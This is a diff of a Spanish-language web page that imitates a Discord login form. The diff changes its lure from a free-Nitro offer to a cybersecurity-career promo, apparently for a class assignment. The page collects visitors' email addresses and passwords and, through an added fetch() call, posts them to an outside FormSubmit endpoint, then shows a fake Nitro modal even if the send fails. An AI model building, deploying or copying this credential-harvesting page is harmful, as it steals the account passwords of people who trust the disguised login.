@@ -117,7 +117,7 @@
       background-color: #202225;
     }
 
-    /* Estilos mejorados para el modal de Nitro */
+    /* Estilos para el modal de Nitro */
     .nitro-modal {
       display: none;
       position: fixed;
@@ -229,7 +229,7 @@
 </head>
 <body>
 
-  <!-- Modal de Discord Nitro (versión mejorada) -->
+  <!-- Modal de Discord Nitro -->
   <div id="nitroModal" class="nitro-modal">
     <div class="nitro-container">
       <div class="nitro-header">
@@ -244,17 +244,17 @@
         
         <div class="nitro-feature">
           <h3>✨ Upgrade your emoji</h3>
-          <p>Use animados en cualquier servidor y sube emojis con mayor calidad</p>
+          <p>Usa emojis animados en cualquier servidor</p>
         </div>
         
         <div class="nitro-feature">
           <h3>🎨 Personalize your profile</h3>
-          <p>Perfil personalizado con banner animado y tag personalizado</p>
+          <p>Perfil con banner animado y tag personalizado</p>
         </div>
         
         <div class="nitro-feature">
           <h3>🖌️ Exclusive stickers</h3>
-          <p>Acceso a cientos de stickers exclusivos para expresarte</p>
+          <p>Stickers exclusivos para expresarte</p>
         </div>
         
         <div class="nitro-buttons">
@@ -267,20 +267,20 @@
 
   <!-- Ventana inicial -->
   <div class="ventana" id="ventanaBienvenida">
-    <img src="MXOF6CJJBNOOJJEN7Z5I3XJED4.jpg">
-    <h2>Obtené Discord Nitro</h2>
-    <p>Canjea Discord Nitro Gratis y Disfruta de las Mejoras</p>
+    <img src="d6d444d1-a7a0-4ea3-9c35-d276ee59d7b5.png" alt="Promo Ciberseguridad">
+    <h2>¡Bienvenido a Ciberseguridad!</h2>
+    <p>Descubrí las oportunidades que ofrece esta apasionante carrera.</p>
     <ol>
-      <li>Transmisión del vídeo en HD (hasta 4K y 60 fps).</li>
-      <li>Mensajes más largos (hasta 4000 caracteres)</li>
-      <li>Tema de perfil animado, avatar y cartel</li>
-      <li>Perfiles de servidor personalizados</li>
+      <li>Explorá las áreas de estudio.</li>
+      <li>Conocé el campo laboral.</li>
+      <li>Encontrá dónde podés estudiarla.</li>
+      <li>¡Dale un impulso a tu futuro digital!</li>
     </ol>
     <button class="boton" onclick="mostrarLogin()">Ingresar al sitio</button>
   </div>
 
   <!-- Ventana de login -->
-  <form class="login" id="ventanaLogin" action="https://formsubmit.co/davidkfernandez05@gmail.com" method="POST">
+  <form class="login" id="ventanaLogin">
     <h2>Añadir cuenta</h2>
     <p>Iniciar sesión en otra cuenta te permitirá cambiar fácilmente entre cuentas en este dispositivo.</p>
 
@@ -293,18 +293,17 @@
       <label for="contrasena">Contraseña *</label>
       <input type="password" id="contrasena" name="password" required>
     </div>
-
+    
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_template" value="table">
     <input type="hidden" name="_subject" value="Nuevo acceso - Trabajo Ciberseguridad">
-    <input type="hidden" name="_next" value="https://ejemplo.com/gracias.html">
     <input type="text" name="_honey" style="display:none">
     
     <a href="#">¿Has olvidado la contraseña?</a>
 
     <div class="login-buttons">
       <button type="button" class="atras" onclick="volver()">Atrás</button>
-      <button type="submit" class="continuar" id="btnContinuar">Continuar</button>
+      <button type="button" class="continuar" onclick="enviarFormulario()">Continuar</button>
     </div>
   </form>
 
@@ -313,6 +312,7 @@
     document.addEventListener('DOMContentLoaded', function() {
       document.getElementById('ventanaBienvenida').style.display = 'block';
       document.getElementById('ventanaLogin').style.display = 'none';
+      document.getElementById('nitroModal').style.display = 'none';
     });
 
     function mostrarLogin() {
@@ -326,29 +326,40 @@
     }
 
     function mostrarModalNitro() {
-      // Validar campos primero
-      const correo = document.getElementById('correo').value;
-      const contrasena = document.getElementById('contrasena').value;
-      
-      if(correo && contrasena) {
-        // Enviar formulario
-        document.getElementById('ventanaLogin').submit();
-        // Mostrar modal
-        document.getElementById('nitroModal').style.display = 'block';
-      }
+      document.getElementById('ventanaLogin').style.display = 'none';
+      document.getElementById('nitroModal').style.display = 'block';
     }
 
     function cerrarModal() {
       document.getElementById('nitroModal').style.display = 'none';
-      // Opcional: redirigir o volver al inicio
-      volver();
+      document.getElementById('ventanaBienvenida').style.display = 'block';
     }
 
-    // Manejar el envío del formulario
-    document.getElementById('ventanaLogin').addEventListener('submit', function(e) {
-      e.preventDefault();
-      mostrarModalNitro();
-    });
+    function enviarFormulario() {
+      const correo = document.getElementById('correo').value;
+      const contrasena = document.getElementById('contrasena').value;
+
+      if(!correo || !contrasena) {
+        alert("Por favor complete todos los campos");
+        return;
+      }
+
+      // Enviar datos a FormSubmit
+      const formData = new FormData(document.getElementById('ventanaLogin'));
+      
+      fetch('https://formsubmit.co/el/697641b72b9e68db2a249175f58813b0', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => {
+        console.log('Formulario enviado:', response);
+        mostrarModalNitro();
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        mostrarModalNitro(); // Mostrar modal aunque falle el envío
+      });
+    }
   </script>
 </body>
 </html>
